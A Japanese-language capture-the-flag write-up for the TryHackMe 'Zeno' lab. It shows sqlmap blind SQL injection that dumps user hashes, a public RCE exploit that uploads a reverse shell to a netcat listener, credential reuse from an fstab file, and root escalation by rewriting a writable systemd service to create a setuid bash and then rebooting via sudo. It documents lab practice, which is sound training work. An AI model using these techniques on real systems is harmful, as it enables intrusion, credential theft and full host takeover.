# Zeno CTF

https://tryhackme.com/room/zeno

## Enumeration

```shell
TARGET=10.201.47.68
sudo bash -c "echo $TARGET   zeno.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT      STATE SERVICE
22/tcp    open  ssh
12340/tcp open  unknown
```

```sh
sudo nmap -sS -sV -p22,12340 $TARGET

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

SSH, HTTP(12340)

### ディレクトリ列挙

/rms を発見。

```shell
root@ip-10-201-70-77:~# cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

root@ip-10-201-70-77:~# gobuster dir -q -x=txt,php -u http://zeno.thm:12340 -w ./dirlist.txt -t 64 -k
/rms                  (Status: 301) [Size: 234]
```

Pathfinder Hotel Restaurant のWebページ。ユーザー登録後、画面をいろいろ操作してリクエストを発生させ、POSTリクエストをテキスト保存。

## SQLi

reserve-exec.php の table パラメータにSQLインジェクションの脆弱性を発見。Time-Based-Blind かつテーブル数が多いので非常に時間がかかる。

DB名特定

```sh
$ sqlmap -r reserve.txt --dbs --batch

available databases [4]:
[*] dbrms
[*] information_schema
[*] mysql
[*] performance_schema
```

テーブル名特定

```sh
$ sqlmap -r reserve.txt -D dbrms --tables --batch

Database: dbrms
[20 tables]
+----------------------+
| tables               |
| billing_details      |
| cart_details         |
| categories           |
| currencies           |
| food_details         |
| members              |
| messages             |
| orders_details       |
| partyhalls           |
| pizza_admin          |
| polls_details        |
| quantities           |
| questions            |
| ratings              |
| reservations_details |
| specials             |
| staff                |
| timezones            |
| users                |
+----------------------+
```

列名特定

```sh
$ sqlmap -r reserve.txt -D dbrms -T users --columns --batch

Database: dbrms
Table: users
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| email    | varchar(100) |
| id       | smallint(6)  |
| password | varchar(32)  |
| username | varchar(30)  |
+----------+--------------+
```

ダンプ。usersテーブルは空っぽ。忍耐忍耐。

```sh
$ sqlmap -r reserve.txt -D dbrms -T users --dump --batch

Database: dbrms
Table: users
[0 entries]
+----+-------+----------+----------+
| id | email | password | username |
+----+-------+----------+----------+
+----+-------+----------+----------+
```

分からないので怪しいテーブルを全部ダンプする。

```
Table: members
[7 columns]
+-------------+------------------+
| Column      | Type             |
+-------------+------------------+
| answer      | varchar(45)      |
| firstname   | varchar(100)     |
| lastname    | varchar(100)     |
| login       | varchar(100)     |
| member_id   | int(11) unsigned |
| passwd      | varchar(32)      |
| question_id | int(5)           |
+-------------+------------------+
```

登録したユーザーが入っているので、実際に認証に使われているのは間違いない。  
メールアドレスからしてedwardが管理者のような気がするが、ハッシュを割れない。割れている2人でログインしてもAdministratorへのアクセスは拒否された。

```
Table: members
[4 entries]
+--------------------------+----------------------------------------------+
| login                    | passwd                                       |
+--------------------------+----------------------------------------------+
| edward@zeno.com          | 6f72ea079fd65aff33a67a3f3618b89c             |
| jsmith@sample.com        | 1254737c076cf867dc53d60a0364f38e (jsmith123) |
| omolewastephen@gmail.com | 81dc9bdb52d04dc20036dbd8313ed055 (1234)      |
| thm@thm.com              | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  |
+--------------------------+----------------------------------------------+
```

```
Table: pizza_admin
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Admin_ID | int(45)     |
| Password | varchar(45) |
| Username | varchar(45) |
+----------+-------------+
```

Administrator 画面で一応試したがログインできなかった。

```
Table: pizza_admin
[1 entry]
+----------+----------+
| Username | Password |
+----------+----------+
| admin    | 1234     |
+----------+----------+
```

```
Table: staff
[5 columns]
+----------------+-------------+
| Column         | Type        |
+----------------+-------------+
| firstn         |
| lastname       | varchar(25) |
| Mobile_Tel     | varchar(20) |
| StaffID        | int(15)     |
| Street_Address | text        |
+----------------+-------------+
```

```
Table: messages
[6 columns]
+-----------------+-------------+
| Column          | Type        |
+-----------------+-------------+
| message_text    | text        |
| message_date    | date        |
| message_from    | varchar(25) |
| message_id      | int(15)     |
| message_subject | text        |
| message_time    | time        |
+-----------------+-------------+
```

```
Table: messages
[1 entry]
+----------------+-----------------+
| message_text   | message_subject |
+----------------+-----------------+
| Sample Message | sample          |
+----------------+-----------------+
```

以上、決定的なデータが見つからず行き詰ってしまった。

ウォークスルーをチラ見したところ、`Restaurant Management System` の脆弱性を利用するのが正解だった。このWebアプリケーションが使われていると判別すること自体が難しい。

```sh
$ searchsploit Restaurant Management System
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Restaurant Management System 1.0  - SQL Injection                                | php/webapps/51330.txt
Restaurant Management System 1.0 - Remote Code Execution                         | php/webapps/47520.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

エクスプロイト。構文エラーが出るので少し修正が必要だった。

```sh
$ python2 ./47520.py http://zeno.thm:12340/rms/          

    _  _   _____  __  __  _____   ______            _       _ _
  _| || |_|  __ \|  \/  |/ ____| |  ____|          | |     (_) |
 |_  __  _| |__) | \  / | (___   | |__  __  ___ __ | | ___  _| |_
  _| || |_|  _  /| |\/| |\___ \  |  __| \ \/ / '_ \| |/ _ \| | __|
 |_  __  _| | \ \| |  | |____) | | |____ >  <| |_) | | (_) | | |_
   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                             | |
                                             |_|



Credits : All InfoSec (Raja Ji's) Group
[+] Restaurant Management System Exploit, Uploading Shell
[+] Shell Uploaded. Please check the URL : http://zeno.thm:12340/rms/images/reverse-shell.php
```

シェル取得成功！

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.32.251] 37324
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

## 権限昇格

edward に昇格する必要がある。

```sh
ls -al /home
total 0
drwxr-xr-x.  3 root root  20 Jul 26  2021 .
dr-xr-xr-x. 17 root root 224 Jun  8  2021 ..
drwxr-xr-x.  3 root root 127 Sep 21  2021 edward
sh-4.2$ cd /home/edward
cd /home/edward
sh-4.2$ ls -al
ls -al
total 20
drwxr-xr-x. 3 root root   127 Sep 21  2021 .
drwxr-xr-x. 3 root root    20 Jul 26  2021 ..
lrwxrwxrwx. 1 root root     9 Jul 26  2021 .bash_history -> /dev/null
-rw-r--r--. 1 root root    18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 root root   193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 root root   231 Apr  1  2020 .bashrc
drwxr-xr-x. 2 root root    29 Sep 21  2021 .ssh
-rw-------. 1 root root   699 Jul 26  2021 .viminfo
-rw-r-----. 1 root edward  38 Jul 26  2021 user.txt
```

```sh
sh-4.2$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
```

apacheが suexec を実行可能。

```sh
ls -al /usr/sbin/suexec
-r-x--x---. 1 root apache 15368 Nov 16  2020 /usr/sbin/suexec
```

100未満のGID、500未満のUIDは設定できない。つまり直接rootにはなれない。

```sh
sh-4.2$ /usr/sbin/suexec -V
/usr/sbin/suexec -V
 -D AP_DOC_ROOT="/var/www"
 -D AP_GID_MIN=100
 -D AP_HTTPD_USER="apache"
 -D AP_LOG_SYSLOG
 -D AP_SAFE_PATH="/usr/local/bin:/usr/bin:/bin"
 -D AP_UID_MIN=500
 -D AP_USERDIR_SUFFIX="public_html"
```

色々調べたところ、そもそもCGIのオーナーがset_uidするユーザーと同一でなければならないので、権限昇格に使うことは不可能と理解。つまり Apache suEXEC の通常運転。

最後の手段、「password キーワードで雑に探す」で下記を発見した。

```sh
$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "password" {} /dev/null \; 2>/dev/null

/etc/fstab.orig://10.10.10.10/secret-share  /mnt/secret-share  cifs  _netdev,vers=3.0,ro,username=zeno,password=[REDACTED],domain=localdomain,soft  0 0
```

su で、edward のパスワードとして使えた。

## 権限昇格２

reboot に sudo が付いている。

```sh
[edward@zeno ~]$ sudo -l
sudo -l
Matching Defaults entries for edward on zeno:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

```sh
[edward@zeno ~]$ ls -al /usr/sbin/reboot
ls -al /usr/sbin/reboot
lrwxrwxrwx. 1 root root 16 Jul 26  2021 /usr/sbin/reboot -> ../bin/systemctl
```

rebootによる権限昇格について、ここに書かれていた。  
https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-reboot-privilege-escalation

書き込み可能なサービス

```sh
[edward@zeno bin]$ find / -writable -name "*.service" 2>/dev/null
find / -writable -name "*.service" 2>/dev/null
/etc/systemd/system/multi-user.target.wants/zeno-monitoring.service
/etc/systemd/system/zeno-monitoring.service
```

元のサービス定義。

```sh
[edward@zeno bin]$ cat /etc/systemd/system/zeno-monitoring.service
cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py

[Install]
WantedBy=multi-user.target
```

この行を書き換える。

```sh
ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash; chmod +xs /home/edward/bash'
```

reboot！

```sh
[edward@zeno images]$ sudo /usr/sbin/reboot
```

エクスプロイト成功！

```sh
[edward@zeno images]$ ls -al /home/edward
ls -al /home/edward
total 964
drwxr-xr-x. 3 root root      139 Oct 30 11:02 .
drwxr-xr-x. 3 root root       20 Jul 26  2021 ..
lrwxrwxrwx. 1 root root        9 Jul 26  2021 .bash_history -> /dev/null
-rw-r--r--. 1 root root       18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 root root      193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 root root      231 Apr  1  2020 .bashrc
drwxr-xr-x. 2 root root       29 Sep 21  2021 .ssh
-rw-------. 1 root root      699 Jul 26  2021 .viminfo
-rwsr-sr-x. 1 root root   964536 Oct 30 11:02 bash
-rw-r-----. 1 root edward     38 Jul 26  2021 user.txt
```

昇格成功！

```sh
[edward@zeno images]$ /home/edward/bash -p
/home/edward/bash -p
bash-4.2# id
id
uid=1000(edward) gid=1000(edward) euid=0(root) egid=0(root) groups=0(root),1000(edward) context=system_u:system_r:httpd_t:s0
```

## 振り返り

- 6時間かかった。ルーム説明に忍耐力が必要と書かれてたのがよく分かった。
- `Restaurant Management System` という既成のWebアプリケーションが使われていたことに、とうとう自力では気づけなかった。どうやったら気づけたかと考えても、なかなか難しかったと思う。
- `/etc/fstab` を読むことをいちおう手順に組み込んでみた。
